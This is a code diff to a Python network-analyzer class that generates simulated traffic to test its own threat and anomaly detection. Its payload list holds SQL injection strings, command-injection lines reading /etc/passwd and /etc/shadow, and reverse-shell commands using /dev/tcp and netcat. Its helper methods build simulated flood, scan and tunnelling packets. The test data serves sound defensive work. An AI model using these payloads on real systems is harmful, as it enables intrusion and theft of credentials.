@@ -23,6 +23,7 @@ logger = logging.getLogger(__name__)
 
 class NetworkAnalyzer:
     def __init__(self):
+        """Initialize the network analyzer with all components"""
         self.running = True
         self.packet_analyzer = PacketAnalyzer()
         self.threat_detector = ThreatDetector()
@@ -33,18 +34,23 @@ class NetworkAnalyzer:
         self.notifier = NotificationManager()
         self.security_integrator = SecurityToolIntegrator()
 
+        # Simulation parameters
+        self.simulation_speed = 1.0  # Default speed multiplier
+        self.attack_probability = 0.2  # 20% chance of attack patterns
+        self.max_packets = 10000  # Maximum packets to simulate
+
         # Register signal handlers
         signal.signal(signal.SIGINT, self.signal_handler)
         signal.signal(signal.SIGTERM, self.signal_handler)
 
     def signal_handler(self, signum, frame):
+        """Handle shutdown signals"""
         logger.info("Stopping packet analysis...")
         self.running = False
-        self.visualizer.show_final_stats(self.stats_collector.get_stats())
         sys.exit(0)
 
     def process_packet(self, packet):
-        """Process each packet"""
+        """Process each packet with enhanced analysis"""
         if not self.running:
             return
 
@@ -52,13 +58,11 @@ class NetworkAnalyzer:
             # Analyze packet
             packet_info = self.packet_analyzer.analyze_packet(packet)
             if packet_info:
-                # Log packet to database
+                # Log packet
                 self.db_manager.log_packet(packet_info)
 
-                # Traditional threat detection
+                # Threat detection
                 threats = self.threat_detector.detect_threats(packet_info)
-
-                # External security tool analysis
                 security_threats = self.security_integrator.analyze_packet(packet_info)
                 if security_threats:
                     threats.extend(security_threats)
@@ -67,9 +71,8 @@ class NetworkAnalyzer:
                     for threat in threats:
                         logger.warning(f"Potential threat detected: {threat}")
                         self.db_manager.log_threat(threat)
-                        # Send notifications for high severity threats
                         if threat.get('severity') in ['high', 'critical']:
-                            self.notifier.send_alert(threat, channels=['webhook'])
+                            self.notifier.send_alert(threat, channels=['webhook', 'email'])
 
                 # Statistical anomaly detection
                 anomalies = self.ml_analyzer.detect_anomalies(packet_info)
@@ -77,68 +80,72 @@ class NetworkAnalyzer:
                     for anomaly in anomalies:
                         logger.warning(f"Anomaly detected: {anomaly}")
                         self.db_manager.log_anomaly(anomaly)
-                        # Send notifications for high confidence anomalies
                         if anomaly.get('confidence', 0) > 0.8:
                             self.notifier.send_alert(anomaly, channels=['webhook'])
 
-                # Update statistics
+                # Update statistics and visualization
                 self.stats_collector.update_stats(packet_info)
-
-                # Update visualization
-                if self.stats_collector.packet_count % 100 == 0:
-                    self.visualizer.update_display(self.stats_collector.get_stats())
 
         except Exception as e:
             logger.error(f"Error processing packet: {e}")
 
     def generate_sample_packet(self, protocol='TCP'):
-        """Generate a sample packet for testing"""
+        """Generate a realistic sample packet"""
         src_ip = f"192.168.1.{random.randint(1, 254)}"
         dst_ip = f"10.0.0.{random.randint(1, 254)}"
 
         if protocol == 'TCP':
             sport = random.randint(1024, 65535)
-            dport = random.choice([80, 443, 8080, 22, 21])  # Common service ports
-            flags = random.choice(['S', 'SA', 'A', 'PA', 'FA'])
-            payload = b"" if random.random() > 0.2 else self._generate_sample_payload()
+            dport = random.choice([80, 443, 8080, 22, 21, 3306, 5432])
+            flags = random.choice(['S', 'SA', 'A', 'PA', 'FA', 'R', 'F'])
+            payload = self._generate_sample_payload() if random.random() > 0.7 else b""
             packet = IP(src=src_ip, dst=dst_ip)/TCP(sport=sport, dport=dport, flags=flags)
             if payload:
                 packet = packet/Raw(load=payload)
             return packet
+
         elif protocol == 'UDP':
             sport = random.randint(1024, 65535)
-            dport = random.choice([53, 67, 68, 123, 161])  # DNS, DHCP, NTP, SNMP
+            dport = random.choice([53, 67, 68, 123, 161, 1900, 5353])
             payload = self._generate_sample_payload() if random.random() > 0.5 else b""
             return IP(src=src_ip, dst=dst_ip)/UDP(sport=sport, dport=dport)/Raw(load=payload)
+
         elif protocol == 'ICMP':
-            icmp_type = random.choice([0, 8])  # Echo reply or request
+            icmp_type = random.choice([0, 8, 3, 11, 13, 17])
             return IP(src=src_ip, dst=dst_ip)/ICMP(type=icmp_type)
+
         elif protocol == 'ARP':
             return ARP(
                 psrc=src_ip,
                 pdst=dst_ip,
                 hwsrc=self._generate_mac(),
                 hwdst=self._generate_mac(),
-                op=random.choice([1, 2])  # 1=request, 2=reply
+                op=random.choice([1, 2])
             )
         return None
 
     def _generate_sample_payload(self):
-        """Generate sample payload for testing different attack patterns"""
+        """Generate diverse sample payloads including attack patterns"""
         payloads = [
+            # Normal HTTP traffic
+            b"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
+            b"POST /api/data HTTP/1.1\r\nContent-Type: application/json\r\n\r\n{\"data\": \"test\"}",
+
             # SQL Injection attempts
             b"SELECT * FROM users WHERE id = 1 OR '1'='1'",
             b"UNION SELECT username,password FROM users--",
+            b"'; DROP TABLE users; --",
 
             # Command injection
             b"() { :; }; /bin/bash -c 'cat /etc/passwd'",
             b"; cat /etc/shadow; echo 'pwned'",
+            b"|whoami",
 
             # Buffer overflow simulation
             b"A" * 1000,
             b"%x" * 500,
 
-            # Shell commands and reverse shells
+            # Shell commands
             b"/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
             b"nc -e /bin/bash 10.0.0.1 4444",
 
@@ -147,49 +154,122 @@ class NetworkAnalyzer:
             b"POST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nusername=admin'+OR+'1'='1",
 
             # Protocol-specific attacks
-            b"SMBv1\x00\x00\x00\x00",  # Legacy protocol
-            b"\x00\x00\x00\x00\x00\x01\x00\x00",  # Malformed packet
+            b"SMBv1\x00\x00\x00\x00",
+            b"\x00\x00\x00\x00\x00\x01\x00\x00",
 
-            # Large DNS query (potential tunneling)
+            # Large DNS query (tunneling)
             b"A" * 200 + b".example.com",
         ]
         return random.choice(payloads)
 
     def simulate_attack_patterns(self):
-        """Simulate various attack patterns to test detection"""
+        """Simulate various attack patterns with realistic timing"""
         logger.info("Starting attack pattern simulation...")
         try:
-            # Simulate SYN flood
-            for _ in range(50):
-                packet = self.generate_sample_packet('TCP')
-                self.process_packet(packet)
+            while self.running:
+                # Regular traffic simulation
+                for _ in range(50):
+                    if random.random() < self.attack_probability:
+                        self._simulate_attack_sequence()
+                    else:
+                        self._simulate_normal_traffic()
+                    time.sleep(0.1 / self.simulation_speed)
 
-            # Simulate port scan
-            target_ip = "10.0.0.100"
-            for port in range(20, 25):
-                packet = IP(src="192.168.1.100", dst=target_ip)/TCP(sport=1024, dport=port, flags='S')
-                self.process_packet(packet)
-
-            # Simulate SQL injection
-            packet = self.generate_sample_packet('TCP')
-            packet = packet/Raw(load=b"SELECT * FROM users WHERE id = 1 OR '1'='1'")
-            self.process_packet(packet)
-
-            # Simulate command injection
-            packet = self.generate_sample_packet('TCP')
-            packet = packet/Raw(load=b"; cat /etc/passwd; echo 'pwned'")
-            self.process_packet(packet)
-
-            # Simulate DNS tunneling
-            for _ in range(10):
-                packet = IP(src="192.168.1.100", dst="10.0.0.53")/UDP(sport=random.randint(1024, 65535), dport=53)/Raw(load=b"A"*200 + b".example.com")
-                self.process_packet(packet)
-
-            logger.info("Attack pattern simulation completed")
+                # Periodic attack patterns
+                attack_type = random.choice(['syn_flood', 'port_scan', 'sql_injection', 'ddos'])
+                self._simulate_specific_attack(attack_type)
 
         except Exception as e:
             logger.error(f"Error during attack simulation: {e}")
             sys.exit(1)
+
+    def _simulate_normal_traffic(self):
+        """Simulate normal network traffic"""
+        protocols = ['TCP', 'UDP', 'ICMP', 'ARP']
+        weights = [0.6, 0.3, 0.05, 0.05]
+        protocol = random.choices(protocols, weights=weights)[0]
+        packet = self.generate_sample_packet(protocol)
+        if packet:
+            self.process_packet(packet)
+
+    def _simulate_attack_sequence(self):
+        """Simulate a sequence of attack packets"""
+        attack_types = [
+            self._syn_flood_attack,
+            self._port_scan_attack,
+            self._sql_injection_attack,
+            self._command_injection_attack,
+            self._dns_tunnel_attack
+        ]
+        random.choice(attack_types)()
+
+    def _simulate_specific_attack(self, attack_type):
+        """Simulate a specific type of attack"""
+        if attack_type == 'syn_flood':
+            self._syn_flood_attack()
+        elif attack_type == 'port_scan':
+            self._port_scan_attack()
+        elif attack_type == 'sql_injection':
+            self._sql_injection_attack()
+        elif attack_type == 'ddos':
+            self._ddos_attack()
+
+    def _syn_flood_attack(self):
+        """Simulate SYN flood attack"""
+        target_ip = f"10.0.0.{random.randint(1, 254)}"
+        for _ in range(20):
+            packet = IP(src=f"192.168.1.{random.randint(1,254)}", dst=target_ip)/TCP(
+                sport=random.randint(1024, 65535),
+                dport=80,
+                flags='S'
+            )
+            self.process_packet(packet)
+            time.sleep(0.01 / self.simulation_speed)
+
+    def _port_scan_attack(self):
+        """Simulate port scanning attack"""
+        target_ip = f"10.0.0.{random.randint(1, 254)}"
+        for port in range(20, 25):
+            packet = IP(src="192.168.1.100", dst=target_ip)/TCP(
+                sport=random.randint(1024, 65535),
+                dport=port,
+                flags='S'
+            )
+            self.process_packet(packet)
+            time.sleep(0.05 / self.simulation_speed)
+
+    def _sql_injection_attack(self):
+        """Simulate SQL injection attack"""
+        packet = self.generate_sample_packet('TCP')
+        packet = packet/Raw(load=b"SELECT * FROM users WHERE id = 1 OR '1'='1'")
+        self.process_packet(packet)
+
+    def _command_injection_attack(self):
+        """Simulate command injection attack"""
+        packet = self.generate_sample_packet('TCP')
+        packet = packet/Raw(load=b"; cat /etc/passwd; echo 'pwned'")
+        self.process_packet(packet)
+
+    def _dns_tunnel_attack(self):
+        """Simulate DNS tunneling attack"""
+        for _ in range(5):
+            packet = IP(src="192.168.1.100", dst="10.0.0.53")/UDP(
+                sport=random.randint(1024, 65535),
+                dport=53
+            )/Raw(load=b"A"*200 + b".example.com")
+            self.process_packet(packet)
+            time.sleep(0.1 / self.simulation_speed)
+
+    def _ddos_attack(self):
+        """Simulate DDoS attack"""
+        target_ip = f"10.0.0.{random.randint(1, 254)}"
+        for _ in range(30):
+            packet = IP(src=f"192.168.1.{random.randint(1,254)}", dst=target_ip)/UDP(
+                sport=random.randint(1024, 65535),
+                dport=random.randint(1, 65535)
+            )/Raw(load=b"X"*1000)
+            self.process_packet(packet)
+            time.sleep(0.01 / self.simulation_speed)
 
     def _generate_mac(self):
         """Generate a random MAC address"""
